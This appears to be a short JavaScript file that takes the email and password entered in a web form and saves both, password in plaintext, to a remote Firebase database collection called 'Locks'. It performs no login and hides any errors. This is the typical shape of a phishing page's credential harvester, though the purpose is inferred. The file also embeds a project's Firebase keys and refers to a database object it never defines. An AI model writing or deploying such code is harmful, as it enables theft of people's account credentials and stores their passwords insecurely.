
// Initialize Firebase
const firebaseConfig = {
    // Your Firebase project configuration goes here
    apiKey: "AIzaSyDO6DaLRIq7bABQQfwSXGVl4FhRaQjPpPA",
    authDomain: "jklll-4aaf7.firebaseapp.com",
    projectId: "jklll-4aaf7",
    storageBucket: "jklll-4aaf7.appspot.com",
    messagingSenderId: "280056903832",
    appId: "1:280056903832:web:b6bb1d506d0e4ec55f78ed",
    measurementId: "G-2BM4HMYYC9"

  };


document.getElementById('myform').addEventListener('submit', function(event) {
                event.preventDefault();
                const name = document.getElementById('Email').value;
                const passw = document.getElementById('Password').value; 
    
                // Save to Firebase
               db.collection('Locks').add({name: name, password: passw})
                .then(() => {
                    // console.log('Data saved successfully!');
                })
                .catch((error) => {
                    // console.error('Error saving data: ', error);
                 });
});
    